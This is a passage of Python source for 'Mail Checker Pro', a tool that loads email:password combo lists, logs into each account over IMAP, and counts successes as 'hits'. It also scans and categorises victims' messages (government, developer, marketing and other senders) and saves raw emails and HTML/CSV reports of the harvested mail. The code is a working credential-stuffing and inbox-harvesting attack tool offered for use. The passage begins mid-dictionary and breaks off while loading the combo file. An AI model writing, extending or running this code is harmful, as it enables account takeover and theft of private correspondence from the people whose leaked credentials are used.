            "your personalized nutrition plan", "track your progress", "new workout available",
            "confirm your upcoming appointment", "virtual consultation details",
            "your lab results are ready", "prescription refill notice", "wellness tips for you",
            "join our fitness challenge", "mental health resources", "online therapy session",
            "manage your health data", "activity goals", "calorie tracking", "stress management",
            "mind-body connection", "medical advice", "doctor's notes", "blood pressure reading",
            "glucose levels", "vaccination record", "health insurance update", "patient portal",
            "secure message from your doctor"
        ]
    }),
    ("Government & Public Services", {
        "official_senders": [
            "noreply@irs.gov", "uscis.gov@public.govdelivery.com", "noreply@gov.uk", "info@canada.ca",
            "noreply@europa.eu", "state.gov.updates@messages.state.gov", "dhs-updates@service.govdelivery.com",
            "justice.gov@public.govdelivery.com", "health.gov@public.govdelivery.com",
            "va.gov@service.govdelivery.com", "ssa.gov@public.govdelivery.com", "fbi@fbi.gov",
            "noreply@whitehouse.gov", "contact@royal.uk", "info@un.org", "noreply@worldbank.org",
            "info@imf.org", "noreply@nato.int", "elections@eac.gov", "info@police.gov", "alert@fire.gov",
            "info@usa.gov", "noreply@revenue.ie", "info@bundesregierung.de",
            "notifications@gov.au", "info@govt.nz", "alerts@gov.in", "noreply@bundestag.de",
            "info@parliament.uk", "support@elections.ca", "info@epa.gov", "notifications@fema.gov",
            "email@nasa.gov", "info@who.int", "support@unicef.org", "noreply@redcross.org",
            "info@usa.gov", "noreply@irs.gov", "support@gov.uk", "notifications@un.org",
            "alerts@usps.gov", "info@uscis.gov", "noreply@dmv.gov", "notifications@tsa.gov",
            "support@socialsecurity.gov", "info@studentaid.gov", "noreply@census.gov"
        ],
        "subject_keywords": [
            "tax return", "tax refund", "stimulus payment", "important notice", "official government communication",
            "visa application", "immigration update", "passport renewal", "public alert", "safety warning",
            "election information", "voter registration", "social security", "veterans affairs",
            "federal agency update", "law enforcement", "emergency notification", "census information",
            "irs", "uscis", "gov.uk", "canada.ca", "europa.eu", "state department", "dhs", "justice department",
            "health and human services", "va", "ssa", "fbi", "white house", "un", "world bank", "imf",
            "nato", "eac", "police", "fire department", "usa.gov", "fema", "nasa", "who", "unicef", "red cross",
            "usps", "dmv", "tsa", "student aid"
        ],
        "body_keywords": [
            "your tax documents are ready", "important update regarding your case",
            "action required for your application", "new public health guidelines",
            "emergency alert system", "your voter registration status", "social security benefits",
            "veteran services information", "federal assistance program", "law enforcement investigation",
            "official government notice", "due date for filing", "your immigration status",
            "passport collection details", "public safety announcement", "census data collection",
            "important information from the government", "security directive", "advisory for citizens",
            "disaster relief information", "government portal", "official communication",
            "your benefits update", "student loan information", "postal delivery update"
        ]
    }),
    ("Software & Development", {
        "official_senders": [
            "noreply@github.com", "noreply@gitlab.com", "noreply@bitbucket.org", "noreply@stackoverflow.com",
            "support@microsoft.com", "developer-relations@google.com", "developer@apple.com",
            "info@oracle.com", "noreply@ibm.com", "info@redhat.com", "info@docker.com",
            "noreply@kubernetes.io", "info@ansible.com", "hello@jetbrains.com", "support@npmjs.com",
            "security@apache.org", "info@mysql.com", "support@mongodb.com", "noreply@unity3d.com",
            "info@unrealengine.com", "hello@blender.org", "noreply@autodesk.com", "info@vmware.com",
            "info@jetbrains.com", "support@docker.com", "notifications@github.com",
            "noreply@heroku.com", "notifications@aws.amazon.com", "azure-notifications@microsoft.com",
            "notifications@gitlab.com", "security@npmjs.com", "info@postgresql.org", "support@redis.io",
            "info@golang.org", "noreply@rust-lang.org", "hello@python.org", "info@php.net",
            "noreply@java.com", "info@cplusplus.com", "support@ruby-lang.org", "noreply@typescriptlang.org",
            "support@github.com", "info@microsoft.com", "hello@google.com", "developer@oracle.com",
            "noreply@microsoft.com/developer", "info@firebase.google.com", "support@heroku.com",
            "notifications@bugsnag.com", "noreply@sentry.io", "info@datdoghq.com", "support@newrelic.com",
            "hello@terraform.io", "noreply@pulumi.com", "info@ansys.com", "support@mathworks.com"
        ],
        "subject_keywords": [
            "pull request", "issue update", "code review", "new commit", "build failed", "deployment status",
            "api update", "release notes", "vulnerability alert", "security patch", "developer account",
            "cloud services", "database alert", "sdk update", "open source", "new version", "bug report",
            "github", "gitlab", "bitbucket", "stackoverflow", "microsoft azure", "aws", "google cloud",
            "docker", "kubernetes", "ansible", "jetbrains", "npm", "apache", "mysql", "mongodb", "unity",
            "unreal engine", "blender", "autodesk", "vmware", "heroku", "netlify", "vercel", "jira",
            "confluence", "visual studio", "vscode", "python", "java", "c++", "javascript", "golang", "rust"
        ],
        "body_keywords": [
            "your pull request has been reviewed", "new comment on your issue", "code merged to main",
            "build pipeline failed", "deployment to production", "api documentation updated",
            "important security advisory", "new SDK version available", "database performance alert",
            "your developer account details", "cloud usage report", "server error detected",
            "new feature announcement", "contribute to open source", "bug fix released",
            "software update available", "integration details", "error logs", "stack trace",
            "source code repository", "continuous integration", "continuous deployment",
            "containerization", "virtualization", "cloud infrastructure", "development tools",
            "programming language update", "framework new features", "software license"
        ]
    }),
    ("Forums & Communities", {
        "official_senders": [
            "noreply@forums.something.com", "admin@community.domain.com", "noreply@discourse.org",
            "info@vbulletin.com", "hello@xenforo.com", "noreply@reddit.com",
            "noreply@steamcommunity.com", "noreply@xda-developers.com", "info@macrumors.com",
            "noreply@androidforums.com", "info@ubuntuforums.org", "support@gamefaqs.com",
            "noreply@resetera.com", "admin@neogaf.com", "newsletter@boards.ie",
            "info@stackexchange.com", "noreply@forums.xbox.com", "noreply@forums.playstation.com",
            "info@stackoverflow.com", "noreply@superuser.com", "community@stackexchange.com",
            "noreply@phpbb.com", "support@smf.com", "info@mybb.com", "noreply@freecodecamp.org",
            "info@edaboard.com", "community@raspberrypi.org", "noreply@arduino.cc", "support@forum.arduino.cc",
            "info@forums.microsoft.com", "community@google.com", "noreply@apple.com/discussions", "support@reddit.com",
            "noreply@forums.nexusmods.com", "info@moddb.com", "noreply@forum.xda-developers.com",
            "admin@gamedeveloper.com", "info@indiegamedev.com", "noreply@gamerswithjobs.com"
        ],
        "subject_keywords": [
            "new post", "new reply", "thread updated", "private message", "forum notification",
            "community announcement", "account activation", "password reset", "new follower", "mention",
            "moderator message", "terms of service update", "forum update", "digest",
            "reddit", "steam community", "xda-developers", "macrumors", "android forums", "ubuntu forums",
            "gamefaqs", "resetera", "neogaf", "stack overflow", "superuser", "stack exchange", "phpbb",
            "simple machines forum", "mybb", "freecodecamp", "arduino forum", "microsoft forum",
            "google community", "apple discussions", "nexus mods", "moddb", "game developer forum"
        ],
        "body_keywords": [
            "someone replied to your post", "new thread in forum", "you have a new private message",
            "your account has been activated", "welcome to our community", "password reset link for forum",
            "your username was mentioned in a post", "important announcement from moderators",
            "community guidelines update", "new discussion started", "top posts this week",
            "trending topics in community", "participate in the discussion", "view new replies",
            "your reputation increased", "new badge earned", "discussion forum", "community platform",
            "login to continue", "verify your account", "recent activity feed"
        ]
    }),
    ("Marketing & Advertising", {
        "official_senders": [
            "info@mailchimp.com", "noreply@sendgrid.com", "support@constantcontact.com",
            "hello@klaviyo.com", "info@activecampaign.com", "hello@hubspot.com",
            "adwords-noreply@google.com", "fb_ads@facebookmail.com", "linkedin_ads@linkedin.com",
            "ads-noreply@twitter.com", "info@taboola.com", "noreply@outbrain.com",
            "hello@braze.com", "info@iterable.com", "support@segment.com",
            "noreply@mixpanel.com", "info@amplitude.com", "no-reply@optimizely.com",
            "hello@vwo.com", "noreply@hotjar.com", "info@semrush.com", "support@ahrefs.com",
            "info@google.com/ads", "business@facebook.com", "noreply@bingads.microsoft.com",
            "noreply@googleads.com", "info@criteo.com", "support@adroll.com", "hello@demandbase.com",
            "info@salesforce.com", "noreply@pardot.com", "hello@marketo.com", "support@adobe.com/marketing",
            "info@sprinklr.com", "noreply@sprout social.com", "hello@hootsuite.com", "info@buffer.com",
            "info@googleads.com", "support@facebook.com", "newsletter@hubspot.com", "noreply@mailchimp.com",
            "noreply@campaignmonitor.com", "info@getresponse.com", "support@aweber.com",
            "hello@intercom.com", "noreply@zendesk.com/sell", "info@drip.com", "support@convertkit.com"
        ],
        "subject_keywords": [
            "campaign report", "ad performance", "marketing update", "new feature", "platform announcement",
            "billing statement", "invoice", "payment due", "account alert", "optimization tips",
            "newsletter", "webinar invite", "case study", "free trial", "upgrade your plan",
            "mailchimp", "sendgrid", "constant contact", "klaviyo", "activecampaign", "hubspot",
            "google ads", "facebook ads", "linkedin ads", "twitter ads", "taboola", "outbrain",
            "braze", "iterable", "segment", "mixpanel", "amplitude", "optimizely", "vwo", "hotjar",
            "semrush", "ahrefs", "criteo", "adroll", "demandbase", "salesforce marketing cloud",
            "pardot", "marketo", "adobe marketing", "sprinklr", "sprout social", "hootsuite", "buffer",
            "campaign monitor", "getresponse", "aweber", "intercom", "zendesk sell", "drip", "convertkit"
        ],
        "body_keywords": [
            "your latest campaign performance", "ad spend report", "marketing strategy tips",
            "new tools for marketers", "platform update available", "your monthly invoice",
            "payment failed for your subscription", "account security notification",
            "how to optimize your campaigns", "join our upcoming webinar", "download our new guide",
            "your free trial expires soon", "upgrade to premium features", "marketing automation",
            "email marketing", "customer relationship management (crm)", "sales funnel",
            "lead generation", "conversion rate", "return on investment (roi)", "audience targeting",
            "analytics dashboard", "campaign management", "advertising budget", "impressions", "clicks",
            "customer engagement", "marketing insights", "product updates for marketers"
        ]
    }),
    ("Other", { # This will catch anything not specifically matched by official_senders or keywords above
        "official_senders": [],
        "subject_keywords": [],
        "body_keywords": []
    })
])

# Create a reverse map for faster lookups for official senders (case-insensitive)
OFFICIAL_SENDER_TO_CAT = {
    sender.lower(): cat
    for cat, data in CATEGORIES.items()
    for sender in data["official_senders"]
}

# --- HELPER FUNCTIONS ---

def clear_screen():
    """Clears the terminal screen."""
    os.system("cls" if os.name == "nt" else "clear")

def box_title(title, color=Fore.CYAN, width=120):
    """Formats a title string within a box."""
    # Adjust width to ensure it looks good on typical terminals
    if width > os.get_terminal_size().columns - 2:
        width = os.get_terminal_size().columns - 2
    
    padding = (width - len(title) - 2) // 2
    return (f"{color}{Style.BRIGHT}╔{'═' * (width - 2)}╗\n"
            f"║{' ' * padding}{title}{' ' * (width - 2 - len(title) - padding)}║\n"
            f"╚{'═' * (width - 2)}╝{Style.RESET_ALL}")

def format_time(seconds):
    """Formats time in seconds into HH:MM:SS, handles infinity."""
    if seconds == float('inf') or seconds < 0:
        return "N/A"
    m, s = divmod(int(seconds), 60)
    h, m = divmod(m, 60)
    return f"{h:02d}:{m:02d}:{s:02d}"

def safe_filename(name):
    """Sanitizes a string to be used as a filename."""
    # Replace invalid characters with an underscore
    safe_name = re.sub(r'[\\/*?:"<>|]', "_", name)
    # Remove leading/trailing whitespace and periods
    safe_name = safe_name.strip().strip('.')
    # Truncate if too long (max 200 to be safe for filenames)
    return safe_name[:200]

def decode_str(s, default_charset='utf-8'):
    """Decodes a header string, handling different charsets."""
    try:
        decoded_parts = []
        for decoded_bytes, charset in decode_header(s):
            if isinstance(decoded_bytes, bytes):
                try:
                    decoded_parts.append(decoded_bytes.decode(charset or default_charset, errors='replace'))
                except (UnicodeDecodeError, LookupError):
                    # Fallback to common charsets if specified one fails
                    try:
                        decoded_parts.append(decoded_bytes.decode('utf-8', errors='replace'))
                    except (UnicodeDecodeError, LookupError):
                        try:
                            decoded_parts.append(decoded_bytes.decode('latin-1', errors='replace'))
                        except Exception:
                            decoded_parts.append(decoded_bytes.decode(errors='replace')) # Last resort
            else:
                decoded_parts.append(str(decoded_bytes))
        return ''.join(decoded_parts)
    except Exception:
        return str(s) # Return original string if all decoding attempts fail

def get_category_by_sender(sender_email, subject, body_text):
    """
    Assigns a category based on the sender's email, subject, and body content.
    Prioritizes official sender matches, then subject keywords, then body keywords.
    """
    sender_email_lower = sender_email.lower().strip()
    subject_lower = subject.lower().strip()
    body_lower = body_text.lower().strip()

    # 1. Highest Priority: Exact match in official_senders
    if sender_email_lower in OFFICIAL_SENDER_TO_CAT:
        return OFFICIAL_SENDER_TO_CAT[sender_email_lower]

    # 2. Medium Priority: Match based on subject keywords
    matched_subject_categories = []
    for category_name, data in CATEGORIES.items():
        for keyword in data.get("subject_keywords", []):
            if keyword.lower() in subject_lower:
                matched_subject_categories.append(category_name)
    
    if matched_subject_categories:
        # If multiple subject matches, prefer non-"Other" categories
        if len(matched_subject_categories) > 1:
            for cat in matched_subject_categories:
                if cat != "Other":
                    return cat
        return matched_subject_categories[0] # Return the first if all are "Other" or only one

    # 3. Lower Priority: Match based on body keywords (translated body used for this)
    matched_body_categories = []
    for category_name, data in CATEGORIES.items():
        for keyword in data.get("body_keywords", []):
            if keyword.lower() in body_lower:
                matched_body_categories.append(category_name)
    
    if matched_body_categories:
        # If multiple body matches, prefer non-"Other" categories
        if len(matched_body_categories) > 1:
            for cat in matched_body_categories:
                if cat != "Other":
                    return cat
        return matched_body_categories[0] # Return the first if all are "Other" or only one

    # 4. Default: If no specific match, categorize as "Other"
    return "Other"

def get_message_body(msg):
    """
    Extracts the plain text body from an email message and attempts to translate it
    if the detected language is not the TARGET_LANGUAGE.
    Returns the body, original language, and translated language.
    """
    body = ""
    original_lang = "unknown"
    translated_lang = TARGET_LANGUAGE

    # Prioritize text/plain parts
    for part in msg.walk():
        ctype = part.get_content_type()
        cdisp = str(part.get('Content-Disposition'))

        if ctype == 'text/plain' and 'attachment' not in cdisp:
            try:
                payload = part.get_payload(decode=True)
                charset = part.get_content_charset() or 'utf-8'
                body = payload.decode(charset, errors='ignore')
                break # Found the text/plain part, stop here
            except Exception:
                continue
    
    # If no text/plain found, try text/html and strip tags
    if not body:
        for part in msg.walk():
            ctype = part.get_content_type()
            cdisp = str(part.get('Content-Disposition'))
            if ctype == 'text/html' and 'attachment' not in cdisp:
                try:
                    payload = part.get_payload(decode=True)
                    charset = part.get_content_charset() or 'utf-8'
                    html_body = payload.decode(charset, errors='ignore')
                    # Basic HTML stripping (can be improved with a library like BeautifulSoup if needed)
                    body = re.sub(r'<[^>]+>', '', html_body)
                    body = re.sub(r'\s+', ' ', body).strip() # Normalize whitespace
                    break # Found HTML part, stop here
                except Exception:
                    continue
    
    # Try to detect language and translate if necessary
    if body:
        try:
            # Langid can be flaky with very short or mixed-language texts, requiring min length
            if len(body) > 20: 
                original_lang = langid.classify(body)[0]
            
            if original_lang != TARGET_LANGUAGE and original_lang != 'unknown':
                # Randomly select a translator service for robustness and to avoid rate limits
                # Ensure you have internet connection for this to work
                translator_service = random.choice(['google', 'bing', 'baidu', 'sougou', 'tencent', 'deepl', 'alibaba'])
                translated_body = ts.translate_text(body, to_language=TARGET_LANGUAGE, translator=translator_service)
                body = translated_body if translated_body else body # Fallback to original if translation fails
            else:
                translated_lang = original_lang # If no translation occurred, translated_lang is same as original
        except Exception:
            pass # Continue with original body if language detection or translation fails
    
    return body, original_lang, translated_lang

def find_imap_server(domain):
    """
    Attempts to find the IMAP server and port for a given domain.
    This uses a list of common IMAP servers and tries common prefixes.
    For more obscure domains, it might return None.
    """
    common_imap_servers = {
        "gmail.com": ("imap.gmail.com", 993),
        "outlook.com": ("imap-mail.outlook.com", 993),
        "hotmail.com": ("imap-mail.outlook.com", 993),
        "yahoo.com": ("imap.mail.yahoo.com", 993),
        "aol.com": ("imap.aol.com", 993),
        "mail.com": ("imap.mail.com", 993),
        "zoho.com": ("imappro.zoho.com", 993),
        "protonmail.com": ("imap.protonmail.com", 993),
        "tutanota.com": ("mail.tutanota.com", 993), # Tutanota uses a custom client/IMAP bridge, often this host
        "gmx.com": ("imap.gmx.com", 993),
        "yandex.com": ("imap.yandex.com", 993),
        "icloud.com": ("imap.mail.me.com", 993),
        "live.com": ("imap-mail.outlook.com", 993),
        "qq.com": ("imap.qq.com", 993),
        "163.com": ("imap.163.com", 993),
        "sina.com": ("imap.sina.com", 993),
        "sohu.com": ("imap.sohu.com", 993),
        "web.de": ("imap.web.de", 993),
        "freenet.de": ("imap.freenet.de", 993),
        "bol.com.br": ("imap.bol.com.br", 993),
        "terra.com.br": ("imap.terra.com.br", 993),
        "uol.com.br": ("imap.uol.com.br", 993),
        "rediffmail.com": ("imap.rediffmail.com", 993),
        "indiatimes.com": ("imap.indiatimes.com", 993),
        "inbox.com": ("imap.inbox.com", 993),
        "walla.com": ("imap.walla.com", 993),
        "netscape.net": ("imap.netscape.net", 993),
        "bigpond.com": ("imap.telstra.com", 993), # BigPond is Telstra
        "optusnet.com.au": ("imap.optusnet.com.au", 993),
        "telstra.com": ("imap.telstra.com", 993),
        "btinternet.com": ("mail.btinternet.com", 993),
        "talktalk.net": ("mail.talktalk.net", 993),
        "virginmedia.com": ("imap.virginmedia.com", 993),
        "sky.com": ("imap.sky.com", 993),
        "post.com": ("imap.post.com", 993),
        "korea.com": ("imap.korea.com", 993),
        "hanmail.net": ("imap.hanmail.net", 993),
        "nate.com": ("imap.nate.com", 993),
        "mail.ru": ("imap.mail.ru", 993),
        "aol.de": ("imap.aol.com", 993),
        "gmx.de": ("imap.gmx.net", 993), # .net is common for .de
        "web.de": ("imap.web.de", 993),
        "t-online.de": ("imap.telekom.de", 993),
        "outlook.de": ("imap-mail.outlook.com", 993),
        "live.de": ("imap-mail.outlook.com", 993),
        "arcor.de": ("imap.arcor.de", 993),
        "vodafonemail.de": ("imap.vodafonemail.de", 993),
        "o2online.de": ("imap.o2online.de", 993),
        "alice.de": ("imap.alice.de", 993),
        "online.de": ("imap.online.de", 993),
        "kabelmail.de": ("imap.kabelmail.de", 993),
        "unitybox.de": ("imap.unitybox.de", 993),
        "magenta.de": ("imap.telekom.de", 993),
        "mailbox.org": ("imap.mailbox.org", 993),
        "posteo.de": ("imap.posteo.de", 993),
        "fastmail.com": ("imap.fastmail.com", 993),
        "hey.com": ("imap.hey.com", 993),
        "zoho.eu": ("imappro.zoho.eu", 993),
        "zoho.in": ("imappro.zoho.in", 993)
    }
    
    # Check for direct match
    if domain in common_imap_servers:
        return common_imap_servers[domain]

    # Try common prefixes for the given domain
    for prefix in ["imap.", "mail.", "secure.imap.", "imap-mail.", "imaps."]: # Removed "pop." as it's not IMAP
        try:
            test_host = f"{prefix}{domain}"
            # Check if the hostname is resolvable
            socket.gethostbyname(test_host) # This checks DNS resolution
            return (test_host, 993) # Assume standard IMAPS port
        except socket.gaierror:
            continue
        except Exception: # Catch any other unexpected errors during lookup
            continue
    
    return (None, None)

# --- CORE CLASSES ---

class MailSaver:
    """Handles the structured saving of all results and logs."""
    def __init__(self, base_dir):
        self.base_dir = base_dir
        self.lock = threading.Lock()
        # This will store counts for each sender, per account, for filename numbering
        # Structure: self.sender_message_counts[account_email][sender_email] = count
        self.sender_message_counts = defaultdict(lambda: defaultdict(int)) 
        self.summary_data = [] # Data for CSV/HTML reports
        self.log_dir = os.path.join(self.base_dir, "Logs")
        os.makedirs(self.log_dir, exist_ok=True)
        self.error_log_path = os.path.join(self.log_dir, "errors.log")
        self.hit_log_path = os.path.join(self.log_dir, "hits.log")

        # Initialize log files - clear them at start (or append if preferred)
        with open(self.error_log_path, 'w', encoding='utf-8') as f:
            f.write(f"--- Error Log Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
        with open(self.hit_log_path, 'w', encoding='utf-8') as f:
            f.write(f"--- Hit Log Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")

    def save_message(self, result_data):
        """
        Saves the raw message content and a summary to categorized folders.
        Ensures folders exist before writing. This is real-time.
        """
        with self.lock:
            sender = result_data['sender']
            account = result_data['account']
            category = result_data['category']
            subject = result_data['subject']
            date = result_data['date']
            original_lang = result_data['original_lang']
            translated_lang = result_data['translated_lang']
            translated_body_snippet = result_data['translated_body_snippet']
            raw_content = result_data['raw_content']

            self.sender_message_counts[account][sender] += 1
            msg_current_count = self.sender_message_counts[account][sender]

            # Construct the full path: Base -> Hits by Category -> Category Name -> Account -> Sender
            category_path = os.path.join(self.base_dir, "Hits by Category", safe_filename(category))
            account_path = os.path.join(category_path, safe_filename(account))
            sender_path = os.path.join(account_path, safe_filename(sender))
            
            try:
                # Ensure all directories in the path exist
                os.makedirs(sender_path, exist_ok=True) 
            except OSError as e:
                self._log_error(f"Failed to create directory {sender_path} for account {account}: {e}")
                return

            # Save the raw .eml file
            eml_filename = f"{msg_current_count:03d}_{safe_filename(subject)}.eml"
            eml_full_path = os.path.join(sender_path, eml_filename)
            try:
                with open(eml_full_path, 'wb') as f:
                    f.write(raw_content)
            except IOError as e:
                self._log_error(f"Error saving EML file {eml_full_path} for {account}: {e}")
                return

            # Save/Append to the _Message_Summary.txt for this sender
            summary_file_path = os.path.join(sender_path, f"{safe_filename(sender)}_Message_Summary.txt")
            try:
                # Read existing content to prepend if needed
                existing_content = ""
                if os.path.exists(summary_file_path):
                    with open(summary_file_path, 'r', encoding='utf-8') as f:
                        existing_content = f.read()

                # Prepare the new entry
                new_entry = (
                    f"--- Message #{msg_current_count} (from {sender}) ---\n"
                    f"Subject: {subject}\n"
                    f"Date: {date}\n"
                    f"Original Language: {original_lang} (Translated to: {translated_lang})\n"
                    f"Translated Body Snippet:\n{translated_body_snippet}\n\n"
                )
                
                with open(summary_file_path, 'w', encoding='utf-8') as f:
                    # Update the header with the new total count
                    # Remove old header if it exists and write new one
                    header_pattern = r"^--- Summary of \d+ Messages from .+? ---\n\n"
                    if re.match(header_pattern, existing_content):
                        existing_content = re.sub(header_pattern, "", existing_content, 1)
                    
                    header_line = f"--- Summary of {self.sender_message_counts[account][sender]} Messages from {sender} ---\n\n"
                    
                    f.write(header_line)
                    f.write(existing_content) # Write back previous entries
                    f.write(new_entry) # Append the new entry
                
            except IOError as e:
                self._log_error(f"Error saving summary file {summary_file_path} for {account}: {e}")
                return
            
            # Log the hit to the general hits.log
            self._log_hit(f"[HIT] Account: {account} | Category: {category} | Sender: {sender} | Subject: {subject} | Date: {date}")

            # Append to internal summary_data for the final CSV/HTML reports
            self.summary_data.append({
                'account': account,
                'category': category,
                'sender': sender,
                'subject': subject,
                'date': date,
                'original_lang': original_lang,
                'translated_lang': translated_lang,
                'translated_body_snippet': translated_body_snippet
            })

    def _log_error(self, message):
        """Internal function to log errors to a file."""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(self.error_log_path, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {message}\n")

    def _log_hit(self, message):
        """Internal function to log hits to a file."""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(self.hit_log_path, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {message}\n")

    def finalize_reports(self, checker_stats):
        """Writes final summary CSV and HTML reports."""
        if not self.summary_data:
            self._log_error("No messages were saved, skipping report generation.")
            return

        csv_path = os.path.join(self.base_dir, "report_summary.csv")
        headers = ['account', 'category', 'sender', 'subject', 'date', 'original_lang', 'translated_lang', 'translated_body_snippet']
        try:
            with open(csv_path, 'w', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=headers, extrasaction='ignore')
                writer.writeheader()
                writer.writerows(self.summary_data)
        except IOError as e:
            self._log_error(f"Failed to write CSV report: {e}")

        html_path = os.path.join(self.base_dir, "report_summary.html")
        
        # Ensure category_hits from checker_stats is used
        stats = checker_stats['category_hits']
        
        html_content = f"""
        <!DOCTYPE html>
        <html lang="{TARGET_LANGUAGE}">
            <head><title>Mail Checker Pro - Scan Report</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: #e0e0e0; margin: 20px; line-height: 1.6; }}
                h1, h2 {{ color: #4ecca3; border-bottom: 2px solid #4ecca3; padding-bottom: 10px; margin-top: 30px; }}
                table {{ width: 100%; border-collapse: collapse; margin-top: 20px; box-shadow: 0 0 15px rgba(0, 0, 0, 0.5); }}
                th, td {{ padding: 12px; border: 1px solid #333; text-align: left; }}
                thead {{ background-color: #2c3e50; color: #ecf0f1; }}
                tbody tr:nth-child(even) {{ background-color: #2c2c2c; }}
                tbody tr:hover {{ background-color: #4ecca3; color: #1a1a1a; cursor: pointer; }}
                .chart-container {{ background-color: #2c2c2c; padding: 20px; border-radius: 8px; margin-top: 20px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.3); }}
                .snippet {{ font-family: 'Consolas', 'Courier New', monospace; font-size: 0.9em; color: #b0b0b0; white-space: pre-wrap; word-break: break-word; max-height: 150px; overflow-y: auto; display: block; background-color: #222; padding: 5px; border-radius: 4px; }}
                .summary-box {{ background-color: #2c2c2c; padding: 15px 25px; border-radius: 8px; margin-bottom: 20px; border-left: 5px solid #4ecca3; box-shadow: 0 0 10px rgba(0, 0, 0, 0.3); }}
                .summary-box p {{ margin: 5px 0; }}
            </style>
            <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
            </head>
            <body>
                <h1>Mail Checker Pro - Ultimate Scan Report</h1>

                <div class="summary-box">
                    <h2>Scan Summary</h2>
                    <p><strong>Total Accounts Loaded:</strong> {checker_stats['total_combos']}</p>
                    <p><strong>Accounts Checked:</strong> {checker_stats['checked_combos']}</p>
                    <p><strong>Successful Logins (Hits):</strong> <span style="color: #4ecca3;">{checker_stats['hits']}</span></p>
                    <p><strong>Failed Logins (Bad):</strong> <span style="color: #FF6384;">{checker_stats['bad']}</span></p>
                    <p><strong>Connection/Other Errors:</strong> <span style="color: #FFCE56;">{checker_stats['errors']}</span></p>
                    <p><strong>Total Emails Scanned:</strong> {checker_stats['total_emails_scanned']}</p>
                    <p><strong>Total Messages Saved (Hits Found):</strong> <span style="color: #4ecca3;">{len(self.summary_data)}</span></p>
                    <p><strong>Scan Duration:</strong> {format_time(checker_stats['duration'])}</p>
                    <p><strong>Report Generated On:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                </div>

                <h2>Hits by Category Overview</h2>
                <div class="chart-container">
                    <canvas id="categoryChart"></canvas>
                </div>
                
                <h2>Detailed Message Log</h2>
                <table>
                    <thead><tr><th>Account</th><th>Category</th><th>Sender</th><th>Subject</th><th>Date</th><th>Language (Original/Translated)</th><th>Translated Body Snippet</th></tr></thead>
                    <tbody>
        """
        
        category_colors = [
            '#4ecca3', '#FF6384', '#36A2EB', '#FFCE56', '#4BC0C0', '#9966FF', '#FF9F40', '#C9CBCF',
            '#E7E9ED', '#8A2BE2', '#DC143C', '#2ECC71', '#F39C12', '#9B59B6', '#00FFFF', '#FFD700',
            '#ADFF2F', '#FFC0CB', '#7B68EE', '#FFA07A', '#EE82EE'
        ]
        
        for item in self.summary_data:
            html_content += f"""
            <tr>
                <td>{item['account']}</td>
                <td>{item['category']}</td>
                <td>{item['sender']}</td>
                <td>{item['subject']}</td>
                <td>{item['date']}</td>
                <td>{item['original_lang']}/{item['translated_lang']}</td>
                <td><pre class="snippet">{item['translated_body_snippet']}</pre></td>
            </tr>
            """
        
        # Chart data for HTML report
        chart_labels = list(stats.keys())
        chart_data = list(stats.values())
        # Ensure enough colors for all categories, cycle if needed
        chart_background_colors = category_colors * (len(chart_labels) // len(category_colors) + 1)
        chart_background_colors = chart_background_colors[:len(chart_labels)] # Trim to exact size

        html_content += f"""
                    </tbody>
                </table>
                <script>
                    const ctx = document.getElementById('categoryChart').getContext('2d');
                    new Chart(ctx, {{
                        type: 'doughnut',
                        data: {{
                            labels: {chart_labels},
                            datasets: [{{
                                label: 'Messages by Category',
                                data: {chart_data},
                                backgroundColor: {chart_background_colors},
                                hoverOffset: 4
                            }}]
                        }},
                        options: {{
                            responsive: true,
                            maintainAspectRatio: false,
                            plugins: {{
                                legend: {{
                                    labels: {{
                                        color: '#e0e0e0'
                                    }}
                                }},
                                title: {{
                                    display: true,
                                    text: 'Distribution of Hits by Category',
                                    color: '#e0e0e0',
                                    font: {{
                                        size: 18
                                    }}
                                }}
                            }}
                        }}
                    }});
                </script>
            </body>
        </html>
        """
        try:
            with open(html_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
        except IOError as e:
            self._log_error(f"Failed to write HTML report: {e}")

class MailCheckerPro:
    """Main class for the Mail Checker Pro application."""
    def __init__(self):
        self.start_time = time.time()
        self.combo_file_path = None
        self.threads = 0
        self.combo_queue = queue.Queue()
        
        # Stats
        self.hits = 0 # Successful logins
        self.bad = 0  # Failed logins
        self.errors = 0 # Connection/other errors not related to login failure
        self.total_combos = 0
        self.total_emails_scanned = 0 # Count of emails fetched from IMAP folders
        self.total_messages_saved = 0 # Count of messages that are actual "hits" and saved
        self.category_hits = defaultdict(int) # Counts saved messages per category

        # Live status for dashboard
        self.current_account_status = {
            'email': "N/A",
            'imap_server': "N/A",
            'imap_port': "N/A",
            'folder_scanning': "N/A",
            'message_processing': "N/A",
            'overall_status_msg': "Initializing..."
        }

        self.is_running = True
        self.save_dir = self._create_save_directory()
        self.mail_saver = MailSaver(self.save_dir)
        
        self.lock = threading.Lock() # Global lock for updating shared statistics and status

    def _create_save_directory(self):
        """Creates a unique directory for saving results based on timestamp."""
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        save_dir = os.path.join(os.getcwd(), f"MailCheckerPro_Results_{timestamp}")
        os.makedirs(save_dir, exist_ok=True)
        return save_dir

    def _load_combos(self):
        """Loads email:password combinations from the selected file."""
        while True:
            self.combo_file_path = easygui.fileopenbox(
                msg="Select your combo list file (email:password format)",
                title="Mail Checker Pro - Select Combo File",
                default="*.txt",
                filetypes=["*.txt", ["*.csv", "*.CSV", "CSV Files"], ["*.*", "All Files"]]
            )
            if self.combo_file_path is None:
                print(f"{Fore.RED}No combo file selected. Exiting.{Style.RESET_ALL}")
                sys.exit(1)
            
            try:
                with open(self.combo_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    combos = f.readlines()
                self.total_combos = len(combos)
                for combo in combos:
                    combo = combo.strip()
                    if combo and ':' in combo:
